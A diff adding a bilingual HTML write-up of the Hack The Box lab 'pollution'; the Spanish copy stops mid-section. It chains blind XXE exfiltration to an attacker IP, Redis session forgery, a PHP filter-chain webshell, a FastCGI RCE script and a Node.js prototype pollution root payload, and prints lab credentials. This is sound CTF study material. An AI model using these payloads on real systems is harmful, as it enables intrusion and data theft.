@@ -1,0 +1,932 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>pollution | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">pollution</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-hard">hard</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p>The exploitation chain begins with the discovery of the main domain <code>collect.htb</code> and its virtual hosts <code>forum.collect.htb</code> and <code>developers.collect.htb</code>. Through forum enumeration, I obtained a <code>proxy_history.txt</code> file revealing an API endpoint for setting admin roles along with authentication tokens. Using this token, I gained access to an admin panel. Further analysis of the forum led to discovering Blind XXE vulnerability in the registration functionality, which allowed me to perform path traversal and extract sensitive configuration files. Among these files, I found Apache credentials for the developers subdomain and Redis authentication credentials. Cracking the Apache htpasswd hash gave me HTTP Basic Auth access to the developers panel. From the extracted configuration files, I discovered that PHP sessions were stored in Redis, allowing me to forge an authenticated session by manipulating the Redis data directly. This granted me access to the developers panel, which contained an LFI vulnerability restricted to PHP files. Using PHP filter chains, I achieved RCE through the LFI and obtained a shell as <code>www-data</code>. Privilege escalation to user <code>victor</code> was accomplished by exploiting PHP-FPM on port 9000 through FastCGI protocol, injecting PHP code to gain a reverse shell. Finally, I escalated to <code>root</code> by exploiting a prototype pollution vulnerability in a Node.js pollution API that was running as root. By polluting the <code>exec</code> function's prototype with malicious shell options, I achieved arbitrary command execution as root and set the SUID bit on <code>/bin/bash</code> to obtain a privileged shell.</p>
+                    <p><strong>Key Techniques:</strong> Blind XXE Path Traversal, Redis Session Forgery, LFI to RCE via PHP Filter Chains, PHP-FPM FastCGI Exploitation, Prototype Pollution RCE in Node.js</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h3>Initial Reconnaissance</h3>
+                <p>Starting with an Nmap scan, I discover several open ports including HTTP and Redis:</p>
+                <p><img src="./media/image2.png" alt="Nmap scan results" /></p>
+
+                <p>The scan reveals port 6379 running Redis, which is particularly interesting as it's typically not exposed externally.</p>
+
+                <p>I add the discovered virtual host <code>collect.htb</code> to my <code>/etc/hosts</code> file and begin web enumeration.</p>
+
+                <h3>Web Enumeration</h3>
+
+                <p>Running <code>whatweb</code> against the target:</p>
+
+                <pre><code class="language-bash">whatweb http://collect.htb</code></pre>
+
+                <p>Returns interesting information including an email <code>info@collect.htb</code> and Apache 2.4.54 on Debian.</p>
+
+                <p>I notice something peculiar: when clicking on fragment identifier links like <code>http://collect.htb/home#about</code>, the URL transforms to <code>http://collect.htb/home#[object%20Object]</code>, suggesting potential JavaScript processing issues.</p>
+
+                <p>Directory enumeration with <code>gobuster</code> reveals:</p>
+
+                <pre><code class="language-bash">/register             (Status: 200) [Size: 4746]
+/login                (Status: 200) [Size: 4740]
+/assets               (Status: 301) [Size: 311]</code></pre>
+
+                <p>When attempting to register or login with special characters like apostrophes, I receive an alert:</p>
+
+                <pre><code class="language-javascript">alert('User with invalid characters')</code></pre>
+
+                <h3>Redis Initial Testing</h3>
+
+                <p>Attempting to connect to Redis without credentials fails:</p>
+
+                <pre><code class="language-bash">redis-cli -h collect.htb -p 6379
+collect.htb:6379> scan 0
+(error) NOAUTH Authentication required.
+collect.htb:6379> INFO
+NOAUTH Authentication required.</code></pre>
+
+                <h3>Virtual Host Discovery</h3>
+
+                <p>Performing vhost enumeration with <code>gobuster</code>, I discover two additional virtual hosts:</p>
+
+                <pre><code class="language-bash">developers.collect.htb Status: 401 [Size: 469]
+forum.collect.htb Status: 200 [Size: 14098]</code></pre>
+
+                <p>I add both to <code>/etc/hosts</code>.</p>
+
+                <p>Accessing <code>developers.collect.htb</code> presents an HTTP Basic Authentication prompt with no known credentials.</p>
+
+                <h3>Forum Exploration</h3>
+
+                <p>The forum at <code>forum.collect.htb</code> runs on MyBB (<a href="https://mybb.com/">https://mybb.com/</a>). Browsing to <code>http://forum.collect.htb/memberlist.php</code>, I find several users: lyon, john, sysadmin, jeorge, karldev, jane, victor, and administrator_forum.</p>
+
+                <p>Several posts mention a "Pollution API", suggesting that <code>developers.collect.htb</code> might be hosting this API.</p>
+
+                <p><img src="./media/image3.png" alt="Forum discussion about Pollution API" /></p>
+
+                <p>One particularly interesting post discusses issues with the API and includes an attachment: <code>proxy_history.txt</code>. To download it, I need to register an account on the forum.</p>
+
+                <h3>Proxy History Analysis</h3>
+
+                <p>After registering and downloading the proxy history file, I discover several API requests. One particularly interesting request stands out:</p>
+
+                <pre><code class="language-xml">&lt;url&gt;&lt;![CDATA[http://collect.htb/set/role/admin]]&gt;&lt;/url&gt;
+&lt;host ip="192.168.1.6"&gt;collect.htb&lt;/host&gt;
+&lt;port&gt;80&lt;/port&gt;
+&lt;protocol&gt;http&lt;/protocol&gt;
+&lt;method&gt;&lt;![CDATA[POST]]&gt;&lt;/method&gt;</code></pre>
+
+                <p>The request is base64 encoded. After decoding:</p>
+
+                <pre><code class="language-http">POST /set/role/admin HTTP/1.1
+Host: collect.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=r8qne20hig1k3li6prgk91t33j
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+
+token=ddac62a28254561001277727cb397baf</code></pre>
+
+                <p>The session cookie is expired, but replacing it with my own and reproducing the request using Burp Suite successfully redirects me to <code>http://collect.htb/admin</code>.</p>
+
+                <h3>Admin Panel Access</h3>
+
+                <p>The admin panel provides a registration interface:</p>
+
+                <p><img src="./media/image1.png" alt="Admin registration panel" /></p>
+
+                <p>Registering a user triggers a simple confirmation alert, but the credentials don't work for <code>developers.collect.htb</code>.</p>
+
+                <h3>XXE Discovery</h3>
+
+                <p>Inspecting the JavaScript code reveals that the registration sends an entire XML structure:</p>
+
+                <pre><code class="language-javascript">function XMLFunction(){
+    var xml = '' +
+        '&lt;?xml version="1.0" encoding="UTF-8"?&gt;' +
+        '&lt;root&gt;' +
+        '&lt;method&gt;POST&lt;/method&gt;' +
+        '&lt;uri&gt;/auth/register&lt;/uri&gt;' +
+        '&lt;user&gt;' +
+        '&lt;username&gt;' + $('#username').val() + '&lt;/username&gt;' +
+        '&lt;password&gt;' + $('#password').val() + '&lt;/password&gt;' +
+        '&lt;/user&gt;' +
+        '&lt;/root&gt;';
+    var xmlhttp = new XMLHttpRequest();
+    xmlhttp.onreadystatechange = function () {
+        if(xmlhttp.readyState == 4){
+            const response = JSON.parse(xmlhttp.responseText);
+            if(response.Status == "Ok")
+            {
+                alert("User registered successfully!");
+            }else{
+                alert("User registrar failed.\nCheck if this user already exists in the database.");
+            }
+            document.getElementById('errorMessage').innerHTML = xmlhttp.responseText;
+        }
+    }
+    xmlhttp.open("POST","/api",true);
+    xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+    xmlhttp.send('manage_api='+xml);
+};</code></pre>
+
+                <p>This is highly suspicious as it directly processes XML, potentially vulnerable to XXE injection.</p>
+
+                <p>Testing confirms the XML is being processed - attempting to register the same user twice yields a different alert message:</p>
+
+                <p><img src="./media/image4.png" alt="Duplicate user registration error" /></p>
+
+                <h3>Blind XXE Exploitation</h3>
+
+                <p>Intercepting the request with Burp Suite, I see the POST to <code>/api</code>:</p>
+
+                <pre><code class="language-http">manage_api=&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;root&gt;&lt;method&gt;POST&lt;/method&gt;&lt;uri&gt;/auth/register&lt;/uri&gt;&lt;user&gt;&lt;username&gt;asd&lt;/username&gt;&lt;password&gt;asd&lt;/password&gt;&lt;/user&gt;&lt;/root&gt;</code></pre>
+
+                <p>Since the response only indicates success or failure, I'll attempt a Blind XXE attack using an out-of-band technique from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/Files/XXE%20OOB%20Attack%20(Yunusov%2C%202013).xml">PayloadsAllTheThings</a>.</p>
+
+                <p>Testing with this request:</p>
+
+                <pre><code class="language-http">manage_api=&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://10.10.14.172/evil.dtd"&gt; %xxe;]&gt;</code></pre>
+
+                <p>And my <code>evil.dtd</code> file:</p>
+
+                <pre><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://10.10.14.172/?x=%file;'&gt;"&gt;
+%eval;</code></pre>
+
+                <p>I receive a hit on my HTTP server, but the server returns an error and no data is exfiltrated.</p>
+
+                <p>After testing various payloads, I discover two issues: file size limitations and formatting problems. Using <code>/etc/hostname</code> instead of <code>/etc/passwd</code> and base64 encoding resolves both:</p>
+
+                <pre><code class="language-http">manage_api=&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE data SYSTEM "http://10.10.14.172/evil.dtd"&gt;&lt;data&gt;&amp;send;&lt;/data&gt;</code></pre>
+
+                <pre><code class="language-xml">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://10.10.14.172/?xd=%file;'&gt;"&gt;
+%eval;
+%exfil;</code></pre>
+
+                <p>This successfully exfiltrates the data:</p>
+
+                <pre><code class="language-bash">10.129.228.126 - - "GET /evil.dtd HTTP/1.1" 200 -
+10.129.228.126 - - "GET /?cG9sbHV0aW9uCg== HTTP/1.1" 200 -
+
+echo "cG9sbHV0aW9uCg==" | base64 -d
+pollution</code></pre>
+
+                <p>To streamline the process, I create a Python server on port 5000 that automatically decodes base64 responses.</p>
+
+                <h3>File Enumeration via XXE</h3>
+
+                <p>Knowing Apache is being used as a reverse proxy, I test common configuration file locations and successfully retrieve:</p>
+
+                <ul>
+                    <li><code>/etc/apache2/sites-available/000-default.conf</code></li>
+                    <li><code>/etc/apache2/sites-enabled/collect.htb.conf</code></li>
+                    <li><code>/etc/apache2/sites-enabled/forum.collect.htb.conf</code></li>
+                    <li><code>/etc/apache2/sites-enabled/developers.collect.htb.conf</code></li>
+                </ul>
+
+                <p>These reveal the application directories:</p>
+
+                <ul>
+                    <li><code>/var/www/collect/public</code></li>
+                    <li><code>/var/www/forum/</code></li>
+                    <li><code>/var/www/developers/</code></li>
+                </ul>
+
+                <p>The developers configuration contains:</p>
+
+                <pre><code class="language-apache">&lt;Directory "/var/www/developers"&gt;
+    AuthType Basic
+    AuthName "Restricted Content"
+    AuthUserFile /var/www/developers/.htpasswd
+    Require valid-user
+&lt;/Directory&gt;</code></pre>
+
+                <p>Extracting <code>/var/www/developers/.htpasswd</code>:</p>
+
+                <pre><code class="language-text">developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1</code></pre>
+
+                <h3>Hash Cracking</h3>
+
+                <p>Hashcat identifies this as Apache MD5 (mode 1600):</p>
+
+                <pre><code class="language-bash">hashcat -m 1600 hash.txt rockyou.txt</code></pre>
+
+                <p>Successfully cracks to: <code>developers_group:r0cket</code></p>
+
+                <h3>Redis Session Forgery</h3>
+
+                <p>I can now access <code>developers.collect.htb</code>, but it presents a login panel without known credentials.</p>
+
+                <p>Examining <code>/var/www/developers/index.php</code> via XXE:</p>
+
+                <pre><code class="language-php">if (!isset($_SESSION['auth']) or $_SESSION['auth'] != True) {
+    die(header('Location: /login.php'));
+}
+
+(...)
+
+&lt;main class="mb-auto mx-24"&gt;
+    &lt;?php include($_GET['page'] . ".php"); ?&gt;
+&lt;/main&gt;</code></pre>
+
+                <p>This reveals an LFI vulnerability restricted to PHP files and a session check for <code>$_SESSION['auth']</code>.</p>
+
+                <p>From <code>/var/www/collect/config.php</code>:</p>
+
+                <pre><code class="language-php">return [
+    "db" => [
+        "host" => "localhost",
+        "dbname" => "webapp",
+        "username" => "webapp_user",
+        "password" => "Str0ngP4ssw0rdB*12@1",
+        "charset" => "utf8"
+    ],
+];</code></pre>
+
+                <p>And crucially, from <code>/var/www/collect/public/bootstrap.php</code>:</p>
+
+                <pre><code class="language-php">&lt;?php
+ini_set('session.save_handler','redis');
+ini_set('session.save_path','tcp://127.0.0.1:6379/?auth=COLLECTR3D1SPASS');</code></pre>
+
+                <p>Now I have Redis credentials! Connecting to Redis:</p>
+
+                <pre><code class="language-bash">redis-cli -h collect.htb -p 6379
+collect.htb:6379> AUTH COLLECTR3D1SPASS
+OK</code></pre>
+
+                <p>I can see my session cookie with <code>scan 0</code>.</p>
+
+                <p>Redis version: 6.0.16</p>
+
+                <p>Attempting to write a webshell fails:</p>
+
+                <pre><code class="language-bash">config set dir /var/www/html
+config set dbfilename shell.php
+set test "&lt;?php system($_GET['cmd']); ?&gt;"
+save</code></pre>
+
+                <p>However, I can modify session values directly:</p>
+
+                <pre><code class="language-bash">collect.htb:6379> SET PHPREDIS_SESSION:p446kh6utl4343khdja77rnril "auth|b:1;"
+OK</code></pre>
+
+                <p>This sets <code>auth=true</code> as a boolean for my PHP session in <code>developers.collect.htb</code>, bypassing the authentication check.</p>
+
+                <h3>LFI to RCE via PHP Filter Chains</h3>
+
+                <p>Now authenticated, I can exploit the LFI that forces <code>.php</code> extensions. While reading PHP files directly isn't useful, I can use PHP filter chains to achieve RCE: <a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
+
+                <p>Generating a webshell payload:</p>
+
+                <pre><code class="language-bash">python3 php_filter_chain_generator.py --chain '&lt;?php echo shell_exec($_GET["cmd"]);?&gt;'</code></pre>
+
+                <p>Modifying the URL:</p>
+
+                <pre><code class="language-http">http://developers.collect.htb/?cmd=id&page=php://filter/{chain}</code></pre>
+
+                <p>RCE confirmed:</p>
+
+                <p><img src="./media/image5.png" alt="RCE confirmation" /></p>
+
+                <p>Using the webshell, I send myself a reverse shell and gain access as <code>www-data</code>.</p>
+
+                <h3>Privilege Escalation to Victor</h3>
+
+                <p>In <code>/home</code> and <code>/etc/passwd</code>, I find user <code>victor</code>.</p>
+
+                <p>Checking locally open ports with <code>ss -tuln</code>:</p>
+
+                <pre><code class="language-bash">3000, 9000, 3306</code></pre>
+
+                <p>Port 3000 responds with:</p>
+
+                <pre><code class="language-bash">curl localhost:3000
+{"Status":"Ok","Message":"Read documentation from api in /documentation"}</code></pre>
+
+                <p>Port 9000 gives a connection reset error, typical of FastCGI.</p>
+
+                <p>Checking MySQL with the credentials I found earlier reveals some hashed passwords, but none crack successfully.</p>
+
+                <p>Examining running processes with <code>ps -fauxww</code>, I notice PHP-FPM:</p>
+
+                <pre><code class="language-bash">root      970  0.0  1.0 265400 40196 ?        Ss   05:09   0:00 php-fpm: master process (/etc/php/8.1/fpm/php-fpm.conf)</code></pre>
+
+                <p>The configuration file contains:</p>
+
+                <pre><code class="language-ini">include=/etc/php/8.1/fpm/pool.d/*.conf</code></pre>
+
+                <p>Searching for port references, I find that port 9000 is associated with user <code>victor</code>.</p>
+
+                <h3>PHP-FPM FastCGI Exploitation</h3>
+
+                <p>PHP-FPM uses port 9000 for FastCGI. Following the exploitation guide from <a href="https://book.hacktricks.wiki/en/network-services-pentesting/9000-pentesting-fastcgi.html">HackTricks</a>, I find a script for achieving RCE:</p>
+
+                <pre><code class="language-bash">#!/bin/bash
+
+PAYLOAD="&lt;?php echo '&lt;!--'; system('whoami'); echo '--&gt;';"
+FILENAMES="/var/www/public/index.php" # Existing file path
+
+HOST=$1
+B64=$(echo "$PAYLOAD"|base64)
+
+for FN in $FILENAMES; do
+    OUTPUT=$(mktemp)
+    env -i \
+      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
+      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
+      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT
+
+    cat $OUTPUT
+done</code></pre>
+
+                <p>I modify the script to use <code>/var/www/collect/public/index.php</code> as the existing file and change the command to <code>id</code>:</p>
+
+                <pre><code class="language-bash">./exploit.sh 127.0.0.1</code></pre>
+
+                <p>The output confirms command execution as <code>victor</code>:</p>
+
+                <pre><code class="language-text">&lt;!--uid=1002(victor) gid=1002(victor) groups=1002(victor)--&gt;</code></pre>
+
+                <p>Since direct bash doesn't work through the server, I use busybox for a reverse shell, successfully gaining access as <code>victor</code> and obtaining the user flag.</p>
+
+                <p>I add my SSH public key to <code>authorized_keys</code> for persistence.</p>
+
+                <h3>Root Privilege Escalation via Prototype Pollution</h3>
+
+                <p>In victor's home directory, there's a <code>pollution_api</code> folder containing the source code for the application running on port 3000.</p>
+
+                <p>In <code>functions/jwt.js</code>:</p>
+
+                <pre><code class="language-javascript">const jwt = require('jsonwebtoken');
+const SECRET = "JWT_COLLECT_124_SECRET_KEY"</code></pre>
+
+                <p>The process is running as root:</p>
+
+                <pre><code class="language-bash">root  1337  0.0  2.0 1680948 81544 ?  Sl  05:09  0:01  \_ /usr/bin/node /root/pollution_api/index.js</code></pre>
+
+                <p>Analyzing the code with Snyk VSCode extension reveals several prototype pollution vulnerabilities and code injection issues:</p>
+
+                <p><img src="./media/image6.png" alt="Snyk vulnerability scan" /></p>
+
+                <p>The vulnerable <code>merge</code> function is used in <code>Messages_send.js</code>:</p>
+
+                <pre><code class="language-javascript">const messages_send = async(req,res)=>{
+    const token = decodejwt(req.headers['x-access-token'])
+    if(req.body.text){
+
+        const message = {
+            user_sent: token.user,
+            title: "Message for admins",
+        };
+
+        _.merge(message, req.body);
+
+        exec('/home/victor/pollution_api/log.sh log_message');
+(...)</code></pre>
+
+                <p>To access this endpoint, I need admin privileges. I update my role in the database:</p>
+
+                <pre><code class="language-sql">MariaDB [pollution_api]> update users set role = "admin" where id = 1</code></pre>
+
+                <p>After logging in again to get a new JWT with admin role:</p>
+
+                <pre><code class="language-bash">curl localhost:3000/admin/messages/send -X POST -H "x-access-token: {admin_jwt}" -H "Content-Type: application/json" -d '{"text": "asd"}'
+{"Status":"Ok"}</code></pre>
+
+                <h3>Exploiting Prototype Pollution</h3>
+
+                <p>The goal is to exploit prototype pollution to override <code>message.__proto__</code>, which affects all JavaScript objects created with this prototype.</p>
+
+                <p>I'll abuse the <code>exec</code> function that follows the <code>merge</code> call. According to the <a href="https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback">Node.js documentation</a>, <code>exec</code> accepts an options object that can specify which shell to use.</p>
+
+                <p>Following the HackTricks guide on <a href="https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.html#pp2rce-vuln-child_process-functions">Prototype Pollution to RCE</a>, I find a PoC for <code>exec</code>:</p>
+
+                <pre><code class="language-javascript">const { exec } = require("child_process")
+p = {}
+p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
+p.__proto__.argv0 =
+ "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
+p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
+var proc = exec("something")</code></pre>
+
+                <p>Creating a <code>payload.json</code> file to avoid formatting issues with curl:</p>
+
+                <pre><code class="language-json">{"text": "asd", "__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//", "NODE_OPTIONS": "--require /proc/self/cmdline"}}</code></pre>
+
+                <p>Executing the request:</p>
+
+                <pre><code class="language-bash">curl localhost:3000/admin/messages/send -X POST -H "x-access-token: {admin_jwt}" -H "Content-Type: application/json" -d @payload.json</code></pre>
+
+                <p>The file appears in <code>/tmp</code>:</p>
+
+                <pre><code class="language-bash">-rw-r--r--  1 root      root             0 Jan 21 08:57 exec-cmdline</code></pre>
+
+                <p>Modifying the payload to execute <code>chmod u+s /bin/bash</code>:</p>
+
+                <pre><code class="language-json">{"text": "asd", "__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('chmod u+s /bin/bash').toString())//", "NODE_OPTIONS": "--require /proc/self/cmdline"}}</code></pre>
+
+                <p>After executing the curl command, I can now escalate to root:</p>
+
+                <pre><code class="language-bash">bash -p</code></pre>
+
+                <p>Root access achieved and system flag obtained!</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p>La cadena de explotación comienza con el descubrimiento del dominio principal <code>collect.htb</code> y sus hosts virtuales <code>forum.collect.htb</code> y <code>developers.collect.htb</code>. A través de la enumeración del foro, obtuve un archivo <code>proxy_history.txt</code> que revelaba un endpoint de API para establecer roles de administrador junto con tokens de autenticación. Usando este token, conseguí acceso a un panel de administración. El análisis posterior del foro llevó a descubrir una vulnerabilidad de XXE ciego en la funcionalidad de registro, lo que me permitió realizar path traversal y extraer archivos de configuración sensibles. Entre estos archivos, encontré credenciales de Apache para el subdominio developers y credenciales de autenticación de Redis. Crackeando el hash htpasswd de Apache conseguí acceso HTTP Basic Auth al panel de developers. De los archivos de configuración extraídos, descubrí que las sesiones PHP se almacenaban en Redis, lo que me permitió falsificar una sesión autenticada manipulando directamente los datos de Redis. Esto me otorgó acceso al panel de developers, que contenía una vulnerabilidad LFI restringida a archivos PHP. Usando cadenas de filtros PHP, conseguí RCE a través del LFI y obtuve una shell como <code>www-data</code>. La escalada de privilegios al usuario <code>victor</code> se logró explotando PHP-FPM en el puerto 9000 a través del protocolo FastCGI, inyectando código PHP para obtener una reverse shell. Finalmente, escalé a <code>root</code> explotando una vulnerabilidad de contaminación de prototipos en una API de contaminación Node.js que se ejecutaba como root. Al contaminar el prototipo de la función <code>exec</code> con opciones de shell maliciosas, conseguí ejecución arbitraria de comandos como root y establecí el bit SUID en <code>/bin/bash</code> para obtener una shell privilegiada.</p>
+                    <p><strong>Técnicas Clave:</strong> XXE Ciego con Path Traversal, Falsificación de Sesiones Redis, LFI a RCE mediante Cadenas de Filtros PHP, Explotación PHP-FPM FastCGI, RCE por Contaminación de Prototipos en Node.js</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h3>Reconocimiento Inicial</h3>
+                <p>Comenzando con un escaneo Nmap, descubro varios puertos abiertos incluyendo HTTP y Redis:</p>
+                <p><img src="./media/image2.png" alt="Resultados del escaneo Nmap" /></p>
+
+                <p>El escaneo revela el puerto 6379 ejecutando Redis, lo cual es particularmente interesante ya que normalmente no está expuesto externamente.</p>
+
+                <p>Añado el host virtual descubierto <code>collect.htb</code> a mi archivo <code>/etc/hosts</code> y comienzo la enumeración web.</p>
+
+                <h3>Enumeración Web</h3>
+
+                <p>Ejecutando <code>whatweb</code> contra el objetivo:</p>
+
+                <pre><code class="language-bash">whatweb http://collect.htb</code></pre>
+
+                <p>Devuelve información interesante incluyendo un email <code>info@collect.htb</code> y Apache 2.4.54 en Debian.</p>
+
+                <p>Noto algo peculiar: al hacer clic en enlaces con identificadores de fragmento como <code>http://collect.htb/home#about</code>, la URL se transforma a <code>http://collect.htb/home#[object%20Object]</code>, sugiriendo posibles problemas de procesamiento JavaScript.</p>
+
+                <p>La enumeración de directorios con <code>gobuster</code> revela:</p>
+
+                <pre><code class="language-bash">/register             (Status: 200) [Size: 4746]
+/login                (Status: 200) [Size: 4740]
+/assets               (Status: 301) [Size: 311]</code></pre>
+
+                <p>Al intentar registrarme o hacer login con caracteres especiales como apóstrofes, recibo un alert:</p>
+
+                <pre><code class="language-javascript">alert('User with invalid characters')</code></pre>
+
+                <h3>Pruebas Iniciales de Redis</h3>
+
+                <p>Intentar conectarse a Redis sin credenciales falla:</p>
+
+                <pre><code class="language-bash">redis-cli -h collect.htb -p 6379
+collect.htb:6379> scan 0
+(error) NOAUTH Authentication required.
+collect.htb:6379> INFO
+NOAUTH Authentication required.</code></pre>
+
+                <h3>Descubrimiento de Hosts Virtuales</h3>
+
+                <p>Realizando enumeración de vhosts con <code>gobuster</code>, descubro dos hosts virtuales adicionales:</p>
+
+                <pre><code class="language-bash">developers.collect.htb Status: 401 [Size: 469]
+forum.collect.htb Status: 200 [Size: 14098]</code></pre>
+
+                <p>Añado ambos a <code>/etc/hosts</code>.</p>
+
+                <p>Al acceder a <code>developers.collect.htb</code> se presenta un prompt de autenticación HTTP Basic sin credenciales conocidas.</p>
+
+                <h3>Exploración del Foro</h3>
+
+                <p>El foro en <code>forum.collect.htb</code> funciona con MyBB (<a href="https://mybb.com/">https://mybb.com/</a>). Navegando a <code>http://forum.collect.htb/memberlist.php</code>, encuentro varios usuarios: lyon, john, sysadmin, jeorge, karldev, jane, victor y administrator_forum.</p>
+
+                <p>Varios posts mencionan una "Pollution API", sugiriendo que <code>developers.collect.htb</code> podría estar alojando esta API.</p>
+
+                <p><img src="./media/image3.png" alt="Discusión en el foro sobre la Pollution API" /></p>
+
+                <p>Un post particularmente interesante discute problemas con la API e incluye un adjunto: <code>proxy_history.txt</code>. Para descargarlo, necesito registrar una cuenta en el foro.</p>
+
+                <h3>Análisis del Historial del Proxy</h3>
+
+                <p>Tras registrarme y descargar el archivo de historial del proxy, descubro varias peticiones a la API. Una petición particularmente interesante destaca:</p>
+
+                <pre><code class="language-xml">&lt;url&gt;&lt;![CDATA[http://collect.htb/set/role/admin]]&gt;&lt;/url&gt;
+&lt;host ip="192.168.1.6"&gt;collect.htb&lt;/host&gt;
+&lt;port&gt;80&lt;/port&gt;
+&lt;protocol&gt;http&lt;/protocol&gt;
+&lt;method&gt;&lt;![CDATA[POST]]&gt;&lt;/method&gt;</code></pre>
+
+                <p>La petición está codificada en base64. Después de decodificarla:</p>
+
+                <pre><code class="language-http">POST /set/role/admin HTTP/1.1
+Host: collect.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=r8qne20hig1k3li6prgk91t33j
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+
+token=ddac62a28254561001277727cb397baf</code></pre>
+
+                <p>La cookie de sesión está caducada, pero reemplazándola con la mía propia y reproduciendo la petición usando Burp Suite me redirige exitosamente a <code>http://collect.htb/admin</code>.</p>
+
+                <h3>Acceso al Panel de Administración</h3>
+
+                <p>El panel de administración proporciona una interfaz de registro:</p>
+
+                <p><img src="./media/image1.png" alt="Panel de registro de administrador" /></p>
+
+                <p>Registrar un usuario desencadena una simple alerta de confirmación, pero las credenciales no funcionan para <code>developers.collect.htb</code>.</p>
+
+                <h3>Descubrimiento de XXE</h3>
+
+                <p>Inspeccionando el código JavaScript revela que el registro envía una estructura XML completa:</p>
+
+                <pre><code class="language-javascript">function XMLFunction(){
+    var xml = '' +
+        '&lt;?xml version="1.0" encoding="UTF-8"?&gt;' +
+        '&lt;root&gt;' +
+        '&lt;method&gt;POST&lt;/method&gt;' +
+        '&lt;uri&gt;/auth/register&lt;/uri&gt;' +
+        '&lt;user&gt;' +
+        '&lt;username&gt;' + $('#username').val() + '&lt;/username&gt;' +
+        '&lt;password&gt;' + $('#password').val() + '&lt;/password&gt;' +
+        '&lt;/user&gt;' +
+        '&lt;/root&gt;';
+    var xmlhttp = new XMLHttpRequest();
+    xmlhttp.onreadystatechange = function () {
+        if(xmlhttp.readyState == 4){
+            const response = JSON.parse(xmlhttp.responseText);
+            if(response.Status == "Ok")
+            {
+                alert("User registered successfully!");
+            }else{
+                alert("User registrar failed.\nCheck if this user already exists in the database.");
+            }
+            document.getElementById('errorMessage').innerHTML = xmlhttp.responseText;
+        }
+    }
+    xmlhttp.open("POST","/api",true);
+    xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+    xmlhttp.send('manage_api='+xml);
+};</code></pre>
+
+                <p>Esto es altamente sospechoso ya que procesa directamente XML, potencialmente vulnerable a inyección XXE.</p>
+
+                <p>Las pruebas confirman que el XML está siendo procesado - intentar registrar el mismo usuario dos veces produce un mensaje de alerta diferente:</p>
+
+                <p><img src="./media/image4.png" alt="Error de registro de usuario duplicado" /></p>
+
+                <h3>Explotación de XXE Ciego</h3>
+
+                <p>Interceptando la petición con Burp Suite, veo el POST a <code>/api</code>:</p>
+
